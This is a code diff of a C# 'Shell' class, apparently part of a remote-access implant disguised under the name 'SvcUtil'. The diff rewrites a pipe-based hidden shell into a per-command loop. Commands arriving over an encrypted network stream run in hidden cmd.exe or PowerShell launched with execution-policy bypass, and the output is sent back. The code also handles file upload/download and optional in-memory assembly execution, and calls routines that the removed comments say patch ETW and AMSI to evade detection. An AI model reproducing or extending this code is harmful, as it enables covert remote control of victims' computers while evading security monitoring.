@@ -1,5 +1,6 @@
 using System;
-using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.IO;
 using System.Text;
 using System.Threading;
 
@@ -7,372 +8,243 @@ namespace SvcUtil
 {
     internal static class Shell
     {
-        // ── Win32 structs ────────────────────────────────────────────
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct STARTUPINFO
-        {
-            public int cb;
-            public IntPtr lpReserved;
-            public IntPtr lpDesktop;
-            public IntPtr lpTitle;
-            public int dwX, dwY, dwXSize, dwYSize;
-            public int dwXCountChars, dwYCountChars;
-            public int dwFillAttribute;
-            public int dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public bool bInheritHandle;
-        }
-
-        // ── Session data (class, not struct — shared by threads) ─────
+        // ── Session data ────────────────────────────────────────────
 
         internal sealed class SessionData
         {
-            public IntPtr ReadPipeHandle;
-            public IntPtr WritePipeHandle;
-            public IntPtr ProcessHandle;
             public IShellStream Stream;
-            public IntPtr ShellStdinPipe;
-            public IntPtr ShellStdoutPipe;
+            public string WorkDir;
             public volatile bool Running;
         }
 
-        private const int STARTF_USESTDHANDLES = 0x00000100;
-        private const int STARTF_USESHOWWINDOW = 0x00000001;
-        private const short SW_HIDE = 0;
-        private const int DUPLICATE_SAME_ACCESS = 0x2;
-        // ── Core entry point ─────────────────────────────────────────
+        // ── Core entry point ────────────────────────────────────────
 
         /// <summary>
-        /// Execute a command with I/O piped through the stream.
+        /// Run a per-command loop: each line received from the stream
+        /// is executed as a separate short-lived process.
         /// </summary>
         public static bool Execute(string commandLine, IShellStream stream,
                                     bool patchScan = false)
         {
-            var session = new SessionData { Stream = stream, Running = true };
-
-            bool isPowerShell = patchScan && Ctx.Chk(commandLine);
-
-            // Method 1: local process patch (ETW + AMSI in current process)
+            // Patch current process (useful for in-process operations)
             if (patchScan)
                 Ctx.Run();
 
-            if (!CreateSession(commandLine, session))
-                return false;
+            bool usePwsh = patchScan && Ctx.Chk(commandLine);
 
-            if (isPowerShell)
+            var session = new SessionData
             {
-                // Wait for PowerShell to initialize and start reading stdin.
-                // No CREATE_SUSPENDED, no cross-process memory writes —
-                // just stdin reflection, each line individually passes AMSI.
-                Thread.Sleep(500);
-
-                Ctx.IS(session.WritePipeHandle);
-
-                // Wait for PowerShell to process all bypass commands,
-                // then drain the pipe to discard banner + command echoes.
-                // This keeps the listener output clean.
-                Thread.Sleep(400);
-                DrainPipe(session.ReadPipeHandle);
-            }
-
-            // Reader thread: shell stdout → socket
-            var reader = new Thread(() => ReadShellLoop(session))
-            {
-                IsBackground = true,
-                Name = "ShellReader"
+                Stream = stream,
+                WorkDir = Environment.GetFolderPath(
+                    Environment.SpecialFolder.UserProfile),
+                Running = true
             };
 
-            // Writer thread: socket → shell stdin
-            var writer = new Thread(() => WriteShellLoop(session))
+            Prompt(session);
+
+            // ── Command receive loop ────────────────────────────────
+            byte[] buf = new byte[Config.BufferSize];
+            var lb = new StringBuilder(512);
+
+            while (session.Running && stream.Connected)
             {
-                IsBackground = true,
-                Name = "ShellWriter"
-            };
+                int n = stream.Receive(buf, 0, buf.Length);
+                if (n <= 0) break;
 
-            reader.Start();
-            writer.Start();
-
-            // Wait for child process to exit
-            W.MA(session.ProcessHandle, -1);
-
-            // Signal threads to stop and wait for them
-            session.Running = false;
-            reader.Join(2000);
-            writer.Join(2000);
-
-            Cleanup(session);
-            return true;
-        }
-
-        // ── Process creation ─────────────────────────────────────────
-
-        private static bool CreateSession(string commandLine, SessionData session)
-        {
-            var sa = new SECURITY_ATTRIBUTES
-            {
-                nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)),
-                lpSecurityDescriptor = IntPtr.Zero,
-                bInheritHandle = true
-            };
-
-            IntPtr pSa = Marshal.AllocHGlobal(Marshal.SizeOf(sa));
-            Marshal.StructureToPtr(sa, pSa, false);
-
-            try
-            {
-                IntPtr shellStdin = IntPtr.Zero;
-                IntPtr shellStdout = IntPtr.Zero;
-
-                // Pipe for shell stdin: we write → shell reads
-                if (!W.M3(ref shellStdin,
-                                          ref session.WritePipeHandle, pSa, 0))
-                    return false;
-
-                // Pipe for shell stdout: shell writes → we read
-                if (!W.M3(ref session.ReadPipeHandle,
-                                          ref shellStdout, pSa, 0))
+                int seg = 0;
+                for (int i = 0; i < n; i++)
                 {
-                    W.M4(shellStdin);
-                    return false;
-                }
-
-                session.ShellStdinPipe = shellStdin;
-                session.ShellStdoutPipe = shellStdout;
-
-                // Start the shell process
-                if (!StartShell(commandLine, session))
-                {
-                    W.M4(shellStdin);
-                    W.M4(shellStdout);
-                    W.M4(session.ReadPipeHandle);
-                    W.M4(session.WritePipeHandle);
-                    return false;
-                }
-
-                // Close the child-side pipe handles in our process
-                // (the child inherited them via CreateProcess)
-                W.M4(shellStdout);
-                W.M4(shellStdin);
-
-                return true;
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(pSa);
-            }
-        }
-
-        private static bool StartShell(string commandLine, SessionData session)
-        {
-            var si = new STARTUPINFO();
-            si.cb = Marshal.SizeOf(si);
-            si.lpReserved = IntPtr.Zero;
-            si.lpTitle = IntPtr.Zero;
-            si.lpDesktop = IntPtr.Zero;
-            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-            si.wShowWindow = SW_HIDE;
-            si.hStdInput = session.ShellStdinPipe;
-            si.hStdOutput = session.ShellStdoutPipe;
-
-            // Duplicate stdout handle for stderr
-            IntPtr currentProc = W.M6();
-            IntPtr hStdErr = IntPtr.Zero;
-
-            if (!W.M5(currentProc, session.ShellStdoutPipe,
-                                            currentProc, ref hStdErr,
-                                            0, true, DUPLICATE_SAME_ACCESS))
-                return false;
-
-            si.hStdError = hStdErr;
-
-            PROCESS_INFORMATION pi;
-            if (!W.M2(null, commandLine,
-                                           IntPtr.Zero, IntPtr.Zero,
-                                           true, 0, IntPtr.Zero, null,
-                                           ref si, out pi))
-            {
-                W.M4(hStdErr);
-                return false;
-            }
-
-            // Close duplicated stderr handle in parent (child inherited it)
-            W.M4(hStdErr);
-
-            session.ProcessHandle = pi.hProcess;
-            W.M4(pi.hThread);
-
-            return true;
-        }
-
-        // ── I/O loop: shell stdout → encrypted socket ────────────────
-
-        private static void ReadShellLoop(SessionData session)
-        {
-            byte[] pipeBuf = new byte[Config.BufferSize];
-
-            while (session.Running)
-            {
-                int bytesRead, bytesAvailable;
-
-                if (!W.M7(session.ReadPipeHandle,
-                        pipeBuf, pipeBuf.Length,
-                        out bytesRead, out bytesAvailable, IntPtr.Zero))
-                    break;
-
-                if (bytesAvailable <= 0)
-                {
-                    Thread.Sleep(50);
-                    continue;
-                }
-
-                // Read exactly what is available (up to buffer size)
-                int toRead = Math.Min(bytesAvailable, pipeBuf.Length);
-                int actualRead;
-                if (!W.M8(session.ReadPipeHandle,
-                        pipeBuf, toRead, out actualRead, IntPtr.Zero))
-                    break;
-
-                if (actualRead <= 0) continue;
-
-                // Send through encrypted stream
-                if (!session.Stream.Send(pipeBuf, 0, actualRead))
-                    break;
-            }
-
-            session.Running = false;
-        }
-
-        // ── I/O loop: encrypted socket → shell stdin ─────────────────
-
-        private static void WriteShellLoop(SessionData session)
-        {
-            byte[] recvBuf = new byte[Config.BufferSize];
-            // Line buffer to detect file transfer commands
-            var lineBuilder = new StringBuilder(512);
-
-            while (session.Running && session.Stream.Connected)
-            {
-                int received = session.Stream.Receive(recvBuf, 0, recvBuf.Length);
-                if (received <= 0) break;
-
-                // Scan for newlines to detect !upload / !download commands
-                int segmentStart = 0;
-                for (int i = 0; i < received; i++)
-                {
-                    if (recvBuf[i] == (byte)'\n' || recvBuf[i] == (byte)'\r')
+                    if (buf[i] == (byte)'\n' || buf[i] == (byte)'\r')
                     {
-                        // Append this segment to line builder
-                        if (i > segmentStart)
-                            lineBuilder.Append(Encoding.UTF8.GetString(
-                                recvBuf, segmentStart, i - segmentStart));
+                        if (i > seg)
+                            lb.Append(Encoding.UTF8.GetString(
+                                buf, seg, i - seg));
 
-                        string line = lineBuilder.ToString();
-                        lineBuilder.Clear();
-                        segmentStart = i + 1;
+                        string line = lb.ToString();
+                        lb.Clear();
+                        seg = i + 1;
 
-                        // Check for special commands (file transfer, assembly exec)
-                        if (FileTransfer.TryHandle(line, session.Stream))
+                        string trimmed = line.Trim();
+                        if (string.IsNullOrEmpty(trimmed)) continue;
+
+                        // File transfer commands
+                        if (FileTransfer.TryHandle(trimmed, stream))
                             continue;
 #if EXEC_ASM
-                        if (AssemblyRunner.TryHandle(line, session.Stream))
+                        if (AssemblyRunner.TryHandle(trimmed, stream))
                             continue;
 #endif
+                        // Built-in commands (cd, exit)
+                        if (Builtin(trimmed, session))
+                        {
+                            Prompt(session);
+                            continue;
+                        }
 
-                        // Not a special command — forward the line + newline to shell
-                        byte[] lineBytes = Encoding.UTF8.GetBytes(line + "\n");
-                        int written;
-                        W.M9(session.WritePipeHandle,
-                            lineBytes, (uint)lineBytes.Length,
-                            out written, IntPtr.Zero);
+                        // Execute as short-lived process
+                        Run(trimmed, session, usePwsh);
+                        Prompt(session);
                     }
                 }
 
-                // Remaining data after last newline goes into line buffer
-                if (segmentStart < received)
+                // Leftover data without newline
+                if (seg < n)
                 {
-                    lineBuilder.Append(Encoding.UTF8.GetString(
-                        recvBuf, segmentStart, received - segmentStart));
+                    lb.Append(Encoding.UTF8.GetString(
+                        buf, seg, n - seg));
 
-                    // If no newline was found at all, and buffer is getting large,
-                    // flush it directly to the shell (binary data / long command)
-                    if (lineBuilder.Length > Config.BufferSize)
+                    if (lb.Length > Config.BufferSize)
                     {
-                        byte[] raw = Encoding.UTF8.GetBytes(lineBuilder.ToString());
-                        lineBuilder.Clear();
-                        int written;
-                        W.M9(session.WritePipeHandle,
-                            raw, (uint)raw.Length, out written, IntPtr.Zero);
+                        string cmd = lb.ToString().Trim();
+                        lb.Clear();
+                        if (!string.IsNullOrEmpty(cmd))
+                        {
+                            Run(cmd, session, usePwsh);
+                            Prompt(session);
+                        }
                     }
                 }
             }
 
             session.Running = false;
+            try { stream.Close(); } catch { }
+            return true;
         }
 
-        // ── Pipe drain (discard buffered output) ─────────────────────
+        // ── Built-in command handling ────────────────────────────────
 
-        private static void DrainPipe(IntPtr pipeHandle)
+        private static bool Builtin(string line, SessionData session)
         {
-            byte[] buf = new byte[4096];
-            while (true)
+            // ── cd ──
+            if (line.Equals("cd", StringComparison.OrdinalIgnoreCase) ||
+                line.StartsWith("cd ", StringComparison.OrdinalIgnoreCase) ||
+                line.StartsWith("cd\\", StringComparison.OrdinalIgnoreCase) ||
+                line.StartsWith("cd/", StringComparison.OrdinalIgnoreCase))
             {
-                int bytesRead, bytesAvailable;
-                if (!W.M7(pipeHandle, buf, buf.Length,
-                        out bytesRead, out bytesAvailable, IntPtr.Zero))
-                    break;
+                string arg = line.Length > 2
+                    ? line.Substring(2).Trim().Trim('"')
+                    : null;
 
-                if (bytesAvailable <= 0)
-                    break;
+                if (string.IsNullOrEmpty(arg) || arg == "~")
+                {
+                    arg = Environment.GetFolderPath(
+                        Environment.SpecialFolder.UserProfile);
+                }
 
-                int actual;
-                W.M8(pipeHandle, buf,
-                    Math.Min(bytesAvailable, buf.Length),
-                    out actual, IntPtr.Zero);
+                if (!Path.IsPathRooted(arg))
+                    arg = Path.Combine(session.WorkDir, arg);
+
+                try
+                {
+                    arg = Path.GetFullPath(arg);
+                    if (Directory.Exists(arg))
+                        session.WorkDir = arg;
+                    else
+                        Out(session,
+                            "The system cannot find the path specified.\r\n");
+                }
+                catch
+                {
+                    Out(session, "Invalid path.\r\n");
+                }
+                return true;
+            }
+
+            // ── exit / quit ──
+            if (line.Equals("exit", StringComparison.OrdinalIgnoreCase) ||
+                line.Equals("quit", StringComparison.OrdinalIgnoreCase))
+            {
+                session.Running = false;
+                return true;
+            }
+
+            return false;
+        }
+
+        // ── Per-command execution ───────────────────────────────────
+
+        private static void Run(string command, SessionData session,
+                                 bool pwsh)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo();
+
+                if (pwsh)
+                {
+                    psi.FileName = "powershell.exe";
+                    psi.Arguments = "-NoP -NonI -EP Bypass -C " + command;
+                }
+                else
+                {
+                    psi.FileName = "cmd.exe";
+                    psi.Arguments = "/c " + command;
+                }
+
+                psi.WorkingDirectory = session.WorkDir;
+                psi.UseShellExecute = false;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                psi.CreateNoWindow = true;
+
+                using (var proc = Process.Start(psi))
+                {
+                    if (proc == null)
+                    {
+                        Out(session, "Failed to start process.\r\n");
+                        return;
+                    }
+
+                    // Collect stderr in background to avoid deadlock
+                    var errBuf = new StringBuilder();
+                    proc.ErrorDataReceived += (s, e) =>
+                    {
+                        if (e.Data != null) errBuf.AppendLine(e.Data);
+                    };
+                    proc.BeginErrorReadLine();
+
+                    // Stream stdout to remote as it arrives
+                    byte[] rb = new byte[4096];
+                    var stdOut = proc.StandardOutput.BaseStream;
+                    int read;
+                    while ((read = stdOut.Read(rb, 0, rb.Length)) > 0)
+                    {
+                        session.Stream.Send(rb, 0, read);
+                    }
+
+                    // Wait for process to finish
+                    if (!proc.WaitForExit(30000))
+                    {
+                        try { proc.Kill(); } catch { }
+                        Out(session, "\r\n[timeout]\r\n");
+                    }
+
+                    // Give ErrorDataReceived a moment to flush
+                    Thread.Sleep(50);
+
+                    // Send collected stderr after stdout
+                    string err = errBuf.ToString();
+                    if (err.Length > 0)
+                        Out(session, err);
+                }
+            }
+            catch (Exception ex)
+            {
+                Out(session, ex.Message + "\r\n");
             }
         }
 
-        // ── Cleanup ──────────────────────────────────────────────────
+        // ── Output helpers ──────────────────────────────────────────
 
-        private static void Cleanup(SessionData session)
+        private static void Prompt(SessionData session)
         {
-            session.Running = false;
-
-            SafeClose(ref session.ReadPipeHandle);
-            SafeClose(ref session.WritePipeHandle);
-            SafeClose(ref session.ProcessHandle);
-
-            try { if (session.Stream != null) session.Stream.Close(); } catch { }
+            Out(session, "\r\n" + session.WorkDir + "> ");
         }
 
-        private static void SafeClose(ref IntPtr handle)
+        private static void Out(SessionData session, string text)
         {
-            if (handle != IntPtr.Zero)
-            {
-                W.M4(handle);
-                handle = IntPtr.Zero;
-            }
+            byte[] d = Encoding.UTF8.GetBytes(text);
+            session.Stream.Send(d, 0, d.Length);
         }
     }
 }
